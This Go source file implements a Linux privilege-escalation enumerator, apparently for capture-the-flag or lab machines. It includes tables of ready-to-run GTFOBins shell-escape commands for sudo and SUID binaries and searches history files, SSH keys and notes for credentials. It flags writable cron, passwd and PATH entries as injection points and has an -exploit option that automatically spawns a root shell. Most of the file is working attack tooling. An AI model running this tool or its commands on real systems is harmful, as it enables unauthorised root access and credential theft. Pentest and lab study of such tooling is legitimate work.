package main

import (
	"bufio"
	"flag"
	"fmt"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"regexp"
	"sort"
	"strconv"
	"strings"
	"syscall"
	"time"
)

// gtfoSudo maps binaries that grant a trivial shell escape when runnable via
// sudo to the exact command that abuses them. When "sudo -l" reveals one of
// these, enum flags it as a confirmed privilege-escalation vector. Reference:
// https://gtfobins.github.io/#+sudo
var gtfoSudo = map[string]string{
	"python":    `sudo python -c 'import os; os.system("/bin/bash")'`,
	"python2":   `sudo python2 -c 'import os; os.system("/bin/bash")'`,
	"python2.7": `sudo python2.7 -c 'import os; os.system("/bin/bash")'`,
	"python3":   `sudo python3 -c 'import os; os.system("/bin/bash")'`,
	"python3.5": `sudo python3.5 -c 'import os; os.system("/bin/bash")'`,
	"python3.6": `sudo python3.6 -c 'import os; os.system("/bin/bash")'`,
	"perl":      `sudo perl -e 'exec "/bin/bash";'`,
	"ruby":      `sudo ruby -e 'exec "/bin/bash"'`,
	"lua":       `sudo lua -e 'os.execute("/bin/bash")'`,
	"vim":       `sudo vim -c ':!/bin/bash'`,
	"vi":        `sudo vi -c ':!/bin/bash'`,
	"nano":      `sudo nano  (^R^X, then: reset; bash 1>&0 2>&0)`,
	"less":      `sudo less /etc/profile  then type: !/bin/bash`,
	"more":      `sudo more /etc/profile  then type: !/bin/bash`,
	"man":       `sudo man man  then type: !/bin/bash`,
	"awk":       `sudo awk 'BEGIN {system("/bin/bash")}'`,
	"find":      `sudo find . -exec /bin/bash \; -quit`,
	"nmap":      `sudo nmap --interactive  then: !sh   (old nmap)`,
	"tcpdump":   `sudo tcpdump via -z postrotate script (RCE as root)`,
	"tar":       `sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash`,
	"zip":       `sudo zip x.zip x -T --unzip-command="sh -c /bin/bash"`,
	"env":       `sudo env /bin/bash`,
	"bash":      `sudo bash`,
	"sh":        `sudo sh`,
	"ftp":       `sudo ftp  then: !/bin/bash`,
	"git":       `sudo git -p help config  then type: !/bin/bash`,
	"ed":        `sudo ed  then: !/bin/bash`,
	"scp":       `sudo scp -S /path/to/script ...  (S option runs a program)`,
	"mysql":     `sudo mysql -e '\! /bin/bash'`,
}

// gtfoSUID maps SUID-root binaries with a known shell escape to the command
// that abuses the setuid bit. Reference: https://gtfobins.github.io/#+suid
var gtfoSUID = map[string]string{
	"bash":               `./bash -p`,
	"find":               `find . -exec /bin/sh -p \; -quit`,
	"nmap":               `nmap --interactive  then: !sh`,
	"vim":                `vim -c ':py import os; os.execl("/bin/sh","sh","-pc","reset; exec sh -p")'`,
	"less":               `less /etc/profile  then: !/bin/sh -p`,
	"more":               `more /etc/profile  then: !/bin/sh -p`,
	"awk":                `awk 'BEGIN {system("/bin/sh -p")}'`,
	"python":             `python -c 'import os; os.setuid(0); os.system("/bin/sh")'`,
	"perl":               `perl -e 'exec "/bin/sh";'`,
	"env":                `env /bin/sh -p`,
	"cp":                 `cp can overwrite /etc/passwd or arbitrary root-owned files`,
	"nano":               `nano can write to any root-owned file`,
	"tar":                `tar -cf /dev/null /dev/null --checkpoint-action=exec=/bin/sh`,
	"dmcrypt-get-device": ``,
}

// baselineSUID is the set of SUID binaries shipped by default on Ubuntu 16.04.
// Anything found outside this list is highlighted as potentially interesting.
var baselineSUID = map[string]bool{
	"ping": true, "ping6": true, "fusermount": true, "mount": true, "umount": true,
	"su": true, "gpasswd": true, "chfn": true, "passwd": true, "chsh": true,
	"newgrp": true, "sudo": true, "pkexec": true, "at": true,
	"newgidmap": true, "newuidmap": true, "dmcrypt-get-device": true,
	"lxc-user-nic": true, "snap-confine": true, "dbus-daemon-launch-helper": true,
	"polkit-agent-helper-1": true, "ssh-keysign": true,
}

func runEnum(args []string) {
	fs := flag.NewFlagSet("enum", flag.ExitOnError)
	root := fs.String("root", "/", "filesystem root to scan for SUID/SGID/writable files")
	outfile := fs.String("o", "", "also write findings to this file")
	quick := fs.Bool("quick", false, "skip the full-filesystem SUID/writable walk")
	doExploit := fs.Bool("exploit", false, "if a sudo shell-escape is found, launch a root shell (lab use only)")
	fs.Parse(args)

	var extra *os.File
	if *outfile != "" {
		f, err := os.Create(*outfile)
		if err != nil {
			fmt.Fprintf(os.Stderr, "cannot open %s: %v\n", *outfile, err)
			os.Exit(1)
		}
		defer f.Close()
		extra = f
	}
	rep := newReport(extra)

	rep.line(bold("escalator enum") + dim(" - local privilege-escalation enumeration"))
	rep.line(dim("  started " + time.Now().Format(time.RFC1123)))

	systemInfo(rep)
	userInfo(rep)
	vector := sudoCheck(rep)
	if !*quick {
		suidScan(rep, *root)
		sgidScan(rep, *root)
	} else {
		rep.section("SUID / SGID scan")
		rep.note("skipped (-quick)")
	}
	capsCheck(rep, *root)
	cronCheck(rep)
	if !*quick {
		writableCheck(rep, *root)
	}
	interestingFiles(rep)
	pathCheck(rep)

	summary(rep, vector)

	if *doExploit && vector != nil && vector.kind == "sudo" {
		rep.section("Exploit")
		rep.hit("attempting sudo shell escape via %s ...", vector.binary)
		launchSudoShell(vector.binary)
	}
}

// escalationVector records the single best privilege-escalation path found, so
// the summary and the optional -exploit step know what to act on.
type escalationVector struct {
	kind    string // "sudo", "suid", ...
	binary  string
	command string
	detail  string
}

func systemInfo(rep *report) {
	rep.section("System information")
	if v := readFirstLine("/etc/os-release", "PRETTY_NAME="); v != "" {
		rep.info("OS: %s", strings.Trim(strings.TrimPrefix(v, "PRETTY_NAME="), `"`))
	}
	if kv := readFile("/proc/version"); kv != "" {
		rep.info("Kernel: %s", firstN(strings.TrimSpace(kv), 90))
	}
	if h, err := os.Hostname(); err == nil {
		rep.info("Hostname: %s", h)
	}
	// A very old kernel is itself a possible escalation path (kernel exploits).
	if rel := unameRelease(); rel != "" {
		rep.info("Kernel release: %s", rel)
		if strings.HasPrefix(rel, "2.") || strings.HasPrefix(rel, "3.") || strings.HasPrefix(rel, "4.4") {
			rep.hit("kernel is old (%s) - check searchsploit for local root exploits", rel)
		}
	}
}

func userInfo(rep *report) {
	rep.section("User & group context")
	u, err := user.Current()
	if err == nil {
		rep.info("Running as: %s (uid=%s gid=%s)", u.Username, u.Uid, u.Gid)
		if u.Uid == "0" {
			rep.hit("already running as root - nothing to escalate")
		}
	}
	if gids, err := os.Getgroups(); err == nil {
		names := make([]string, 0, len(gids))
		for _, g := range gids {
			names = append(names, groupName(g))
		}
		rep.info("Groups: %s", strings.Join(names, ", "))
		for _, g := range names {
			switch g {
			case "docker":
				rep.hit("member of 'docker' - trivially root via a mounted container")
			case "lxd", "lxc":
				rep.hit("member of '%s' - root via a privileged container image", g)
			case "disk":
				rep.hit("member of 'disk' - raw block-device access allows reading/writing any file")
			case "sudo", "admin":
				rep.note("member of '%s' - check 'sudo -l' for allowed commands", g)
			}
		}
	}
	// Other login users are useful lateral-movement targets.
	var others []string
	for _, l := range readLines("/etc/passwd") {
		f := strings.Split(l, ":")
		if len(f) < 7 {
			continue
		}
		uid, _ := strconv.Atoi(f[2])
		if (uid >= 1000 || uid == 0) && !strings.Contains(f[6], "nologin") && !strings.Contains(f[6], "false") {
			others = append(others, fmt.Sprintf("%s(uid=%d, shell=%s)", f[0], uid, f[6]))
		}
	}
	if len(others) > 0 {
		rep.note("interactive accounts: %s", strings.Join(others, ", "))
	}
}

func sudoCheck(rep *report) *escalationVector {
	rep.section("sudo privileges")
	// -n avoids a password prompt so the tool never hangs.
	out, _ := exec.Command("sudo", "-n", "-l").CombinedOutput()
	text := string(out)
	if strings.Contains(text, "a password is required") || strings.Contains(text, "may not run sudo") {
		rep.note("sudo -l needs a password or is not permitted; run it manually if you have one")
		return nil
	}
	if strings.TrimSpace(text) == "" {
		rep.note("no sudo output")
		return nil
	}
	var vector *escalationVector
	for _, l := range strings.Split(text, "\n") {
		l = strings.TrimSpace(l)
		if l == "" {
			continue
		}
		if strings.Contains(l, "NOPASSWD") || strings.HasPrefix(l, "(") || strings.Contains(l, "ALL") {
			rep.plain("%s", l)
		}
		// Identify the binary a NOPASSWD rule points at and check GTFOBins.
		for _, tok := range strings.Fields(l) {
			if !strings.HasPrefix(tok, "/") {
				continue
			}
			base := filepath.Base(tok)
			base = strings.TrimSuffix(base, ",")
			if cmd, ok := gtfoSudo[base]; ok {
				rep.hit("sudo can run %s - shell escape available (GTFOBins)", tok)
				rep.plain("exploit: %s", strings.Replace(cmd, base, tok, 1))
				if vector == nil {
					vector = &escalationVector{kind: "sudo", binary: tok,
						command: strings.Replace(cmd, base, tok, 1), detail: l}
				}
			}
		}
		if strings.Contains(l, "(ALL : ALL) ALL") || strings.Contains(l, "(ALL) ALL") {
			rep.hit("sudo grants ALL commands - run 'sudo -i' or 'sudo su -' for root")
			if vector == nil {
				vector = &escalationVector{kind: "sudo", binary: "su", command: "sudo -i", detail: l}
			}
		}
	}
	return vector
}

func suidScan(rep *report, root string) {
	rep.section("SUID binaries")
	files := findMode(root, os.ModeSetuid)
	sort.Strings(files)
	for _, f := range files {
		base := filepath.Base(f)
		if cmd, ok := gtfoSUID[base]; ok && cmd != "" {
			rep.hit("%s (SUID) - shell escape available (GTFOBins)", f)
			rep.plain("exploit: %s", cmd)
		} else if !baselineSUID[base] {
			rep.hit("%s (SUID) - non-standard, investigate", f)
		} else {
			rep.plain("%s", f)
		}
	}
	if len(files) == 0 {
		rep.note("none found (or insufficient permissions to scan %s)", root)
	}
}

func sgidScan(rep *report, root string) {
	rep.section("SGID binaries")
	files := findMode(root, os.ModeSetgid)
	sort.Strings(files)
	for _, f := range files {
		rep.plain("%s", f)
	}
	if len(files) == 0 {
		rep.note("none found")
	}
}

func capsCheck(rep *report, root string) {
	rep.section("File capabilities")
	if _, err := exec.LookPath("getcap"); err != nil {
		rep.note("getcap not available; skipping")
		return
	}
	// Scan only the usual binary directories rather than the whole tree: a
	// recursive getcap over "/" would descend into /proc, /sys and any large
	// data mounts and can take minutes on a real host.
	binDirs := []string{}
	for _, d := range []string{"/bin", "/sbin", "/usr/bin", "/usr/sbin",
		"/usr/local/bin", "/usr/local/sbin", "/opt", "/home"} {
		p := filepath.Join(root, d)
		if _, err := os.Stat(p); err == nil {
			binDirs = append(binDirs, p)
		}
	}
	args := append([]string{"-r"}, binDirs...)
	out, _ := exec.Command("getcap", args...).CombinedOutput()
	lines := strings.Split(strings.TrimSpace(string(out)), "\n")
	found := false
	for _, l := range lines {
		l = strings.TrimSpace(l)
		if l == "" {
			continue
		}
		found = true
		if strings.Contains(l, "cap_setuid") || strings.Contains(l, "cap_dac_override") ||
			strings.Contains(l, "cap_sys_admin") || strings.Contains(l, "ep") && strings.Contains(l, "python") {
			rep.hit("%s", l)
		} else {
			rep.plain("%s", l)
		}
	}
	if !found {
		rep.note("no file capabilities set")
	}
}

func cronCheck(rep *report) {
	rep.section("Scheduled jobs (cron)")
	sources := []string{"/etc/crontab"}
	dirs := []string{"/etc/cron.d", "/etc/cron.hourly", "/etc/cron.daily",
		"/etc/cron.weekly", "/etc/cron.monthly"}
	for _, d := range dirs {
		entries, _ := os.ReadDir(d)
		for _, e := range entries {
			if !strings.HasPrefix(e.Name(), ".") {
				sources = append(sources, filepath.Join(d, e.Name()))
			}
		}
	}
	me := os.Getuid()
	any := false
	for _, s := range sources {
		info, err := os.Stat(s)
		if err != nil {
			continue
		}
		// A cron job file writable by us runs its contents as its owner (root).
		if writableByUser(info, me) {
			rep.hit("%s is writable by the current user - inject a command to run as its owner", s)
			any = true
		}
		for _, l := range readLines(s) {
			l = strings.TrimSpace(l)
			if l == "" || strings.HasPrefix(l, "#") {
				continue
			}
			// Cron jobs that call a script by relative name or a user-writable
			// path are classic escalation points.
			if strings.Contains(l, "root") {
				rep.plain("%s: %s", filepath.Base(s), firstN(l, 100))
			}
		}
	}
	// Per-user crontabs (often readable on misconfigured hosts).
	if entries, err := os.ReadDir("/var/spool/cron/crontabs"); err == nil {
		for _, e := range entries {
			rep.note("user crontab present: %s", e.Name())
			any = true
		}
	}
	if !any {
		rep.note("no obviously abusable cron entries visible")
	}
}

func writableCheck(rep *report, root string) {
	rep.section("World-writable & sensitive files")
	// A writable /etc/passwd or /etc/shadow is an instant win.
	for _, p := range []string{"/etc/passwd", "/etc/shadow", "/etc/sudoers"} {
		if info, err := os.Stat(p); err == nil && writableByUser(info, os.Getuid()) {
			rep.hit("%s is writable - add a root user or an entry to gain root", p)
		}
	}
	// World-writable files owned by root are worth reporting but noisy, so cap
	// the count and skip virtual/pseudo filesystems.
	count := 0
	filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return nil
		}
		if info.IsDir() && skipDir(path) {
			return filepath.SkipDir
		}
		// Only regular files matter here: symlinks always lstat as 0777 (their
		// world-write bit is meaningless) and device nodes under /dev are
		// legitimately writable, so both would flood the output with noise.
		if info.Mode().IsRegular() && info.Mode().Perm()&0002 != 0 {
			if st, ok := info.Sys().(*syscall.Stat_t); ok && st.Uid == 0 {
				if count < 25 {
					rep.plain("%s (world-writable, root-owned)", path)
				}
				count++
			}
		}
		return nil
	})
	if count == 0 {
		rep.note("no world-writable root-owned files found")
	} else if count > 25 {
		rep.note("... and %d more world-writable root-owned files", count-25)
	}
}

// interestingFiles greps a few likely spots for credentials and breadcrumbs.
var credRe = regexp.MustCompile(`(?i)(pass(word)?|pwd|secret|token|api[_-]?key)[=: ]`)
var md5Re = regexp.MustCompile(`\b[a-f0-9]{32}\b`)

func interestingFiles(rep *report) {
	rep.section("Credential hunting")
	candidates := []string{
		"/home/important.txt", "/.runme.sh", "/var/backups", "/opt",
	}
	// Home directories: history files, notes, keys.
	if entries, err := os.ReadDir("/home"); err == nil {
		for _, e := range entries {
			base := filepath.Join("/home", e.Name())
			for _, n := range []string{".bash_history", "user.txt", "notes.txt", "creds.txt", ".ssh/id_rsa"} {
				candidates = append(candidates, filepath.Join(base, n))
			}
			candidates = append(candidates, base)
		}
	}
	seen := map[string]bool{}
	for _, c := range candidates {
		if seen[c] {
			continue
		}
		seen[c] = true
		info, err := os.Stat(c)
		if err != nil {
			continue
		}
		if info.IsDir() {
			if ents, err := os.ReadDir(c); err == nil && len(ents) > 0 {
				names := []string{}
				for _, e := range ents {
					names = append(names, e.Name())
				}
				rep.plain("dir %s: %s", c, firstN(strings.Join(names, " "), 100))
			}
			continue
		}
		content := readFile(c)
		if content == "" {
			continue
		}
		rep.note("readable: %s", c)
		for _, l := range strings.Split(content, "\n") {
			if credRe.MatchString(l) || md5Re.MatchString(l) {
				trimmed := strings.TrimSpace(l)
				if trimmed != "" && len(trimmed) < 200 {
					rep.hit("possible credential in %s:", c)
					rep.plain("%s", trimmed)
				}
			}
		}
	}
}

func pathCheck(rep *report) {
	rep.section("PATH & environment")
	path := os.Getenv("PATH")
	rep.info("PATH=%s", path)
	for _, dir := range strings.Split(path, ":") {
		if dir == "." || dir == "" {
			rep.hit("PATH contains '%s' (current dir) - vulnerable to binary hijacking", dir)
			continue
		}
		if info, err := os.Stat(dir); err == nil && writableByUser(info, os.Getuid()) {
			rep.hit("PATH dir %s is writable - plant a binary to hijack commands run by others", dir)
		}
	}
}

func summary(rep *report, v *escalationVector) {
	rep.section("Summary")
	if v == nil {
		rep.note("no single confirmed vector auto-detected - review the [!] findings above")
		return
	}
	rep.hit("most promising vector: %s via %s", v.kind, v.binary)
	rep.plain("run: %s", v.command)
	rep.plain("then: id && cat /root/root.txt")
}

// launchSudoShell runs the detected sudo shell-escape and hands the user an
// interactive root shell. Lab use only; only fires with the explicit -exploit
// flag against a vector the tool already confirmed.
func launchSudoShell(binary string) {
	base := filepath.Base(binary)
	var cmd *exec.Cmd
	switch {
	case strings.HasPrefix(base, "python"):
		cmd = exec.Command("sudo", "-n", binary, "-c", `import os,pty; pty.spawn("/bin/bash")`)
	case base == "perl":
		cmd = exec.Command("sudo", "-n", binary, "-e", `exec "/bin/bash";`)
	default:
		fmt.Fprintf(os.Stderr, "no automated launcher for %s; run the printed command manually\n", binary)
		return
	}
	cmd.Stdin = os.Stdin
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	_ = cmd.Run()
}

// ---- small filesystem/helper utilities -------------------------------------

func findMode(root string, bit os.FileMode) []string {
	var out []string
	filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return nil
		}
		if info.IsDir() {
			if skipDir(path) {
				return filepath.SkipDir
			}
			return nil
		}
		if info.Mode()&bit != 0 && info.Mode().IsRegular() {
			out = append(out, path)
		}
		return nil
	})
	return out
}

// skipDir avoids pseudo-filesystems and mounts that would make a full walk slow
// or meaningless.
func skipDir(path string) bool {
	switch path {
	case "/proc", "/sys", "/dev", "/run", "/snap", "/var/lib/docker",
		"/var/lib/lxcfs", "/media", "/mnt":
		return true
	}
	return false
}

func writableByUser(info os.FileInfo, uid int) bool {
	st, ok := info.Sys().(*syscall.Stat_t)
	if !ok {
		return false
	}
	mode := info.Mode().Perm()
	if mode&0002 != 0 { // world-writable
		return true
	}
	// The owner-write branch is only interesting for an unprivileged user: root
	// owns and can write most of the filesystem, so counting that would flag
	// half the system. Callers run this as the low-priv user they are escalating
	// from, so uid 0 is treated as "not an escalation".
	if uid != 0 && int(st.Uid) == uid && mode&0200 != 0 {
		return true
	}
	if mode&0020 != 0 && inGroup(int(st.Gid)) { // group-writable and we're in the group
		return true
	}
	return false
}

func inGroup(gid int) bool {
	gids, err := os.Getgroups()
	if err != nil {
		return false
	}
	for _, g := range gids {
		if g == gid {
			return true
		}
	}
	return false
}

func groupName(gid int) string {
	if g, err := user.LookupGroupId(strconv.Itoa(gid)); err == nil {
		return g.Name
	}
	return strconv.Itoa(gid)
}

func unameRelease() string {
	var u syscall.Utsname
	if err := syscall.Uname(&u); err != nil {
		return ""
	}
	return int8ToString(u.Release[:])
}

func int8ToString(b []int8) string {
	buf := make([]byte, 0, len(b))
	for _, c := range b {
		if c == 0 {
			break
		}
		buf = append(buf, byte(c))
	}
	return string(buf)
}

func readFile(path string) string {
	b, err := os.ReadFile(path)
	if err != nil {
		return ""
	}
	return string(b)
}

func readLines(path string) []string {
	f, err := os.Open(path)
	if err != nil {
		return nil
	}
	defer f.Close()
	var out []string
	sc := bufio.NewScanner(f)
	sc.Buffer(make([]byte, 0, 64*1024), 1024*1024)
	for sc.Scan() {
		out = append(out, sc.Text())
	}
	return out
}

func readFirstLine(path, prefix string) string {
	for _, l := range readLines(path) {
		if strings.HasPrefix(l, prefix) {
			return l
		}
	}
	return ""
}

func firstN(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "..."
}
